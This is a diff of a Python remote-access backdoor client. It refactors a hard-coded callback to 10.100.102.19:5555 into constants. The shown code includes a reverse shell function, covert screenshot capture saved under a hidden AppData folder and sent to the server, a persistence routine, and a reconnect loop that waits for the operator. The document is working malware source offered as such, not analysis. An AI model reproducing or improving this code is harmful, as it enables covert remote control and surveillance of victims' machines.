@@ -6,9 +6,12 @@ from subprocess import getoutput
 import random
 import pyautogui
 
-BUFFER_SIZE = 4096
-SEPARATOR = "<SEPARATOR>"
-isConncted = False
+BUFFER_SIZE = 4096 #Buffer of conversion
+SEPARATOR = "<SEPARATOR>" #For CMD
+ISCONNCTED = False #Checks if the client is conncted
+IP="10.100.102.19" #IP goes here
+PORT=5555 #Port goes here
+USERNAME = os.getlogin() #Gets the PC User.
 
 
 def string_check(data):  # This checks if the os can run this command
@@ -55,13 +58,12 @@ def reverse_shell(client):  # Returns revese shell to server
 
 def screenshot(client):  # Takes screenshot of PC and send it to server
     try:
-        name = random.randint(0, 100000000)
-        username = os.getlogin()
+        imagename = random.randint(0, 100000000)
         try:
-            os.mkdir(f"C:/Users/{username}/AppData/Roaming/TEMP")
+            os.mkdir(f"C:/Users/{USERNAME}/AppData/Roaming/TEMP")
         except Exception as e:
             pass
-        filename = f"C:/Users/{username}/AppData/Roaming/TEMP/{name}.jpg"
+        filename = f"C:/Users/{USERNAME}/AppData/Roaming/TEMP/{imagename}.jpg"
         im = pyautogui.screenshot()
         im.save(filename)
         client.sendall(filename.encode())
@@ -78,7 +80,7 @@ def screenshot(client):  # Takes screenshot of PC and send it to server
 
 
 def start_client():  # Start the client side and all the communication is here.
-    global isConncted
+    global ISCONNCTED
     try:
         while True:
             command = client.recv(BUFFER_SIZE).decode()
@@ -106,7 +108,7 @@ def start_client():  # Start the client side and all the communication is here.
                 client.sendall("Invalid Command".encode())
 
     except Exception as e:
-        isConncted = False
+        ISCONNCTED = False
         client.close
         print(f"Server disconnected!")
         sleep(1)
@@ -122,12 +124,12 @@ def persistence():
         print(f"{e}")
 
 while True:
-    if(isConncted == False):
+    if(ISCONNCTED == False):
         try:
             client = socket(AF_INET, SOCK_STREAM)
-            client.connect(("10.100.102.19", 5555))
-            isConncted = True
-            print("Conncted to Server!")
+            client.connect((IP, PORT))
+            ISCONNCTED = True
+            print("Conncted.")
             start_client()  # Starts client
         except Exception as e:
             print("Wating for server..")
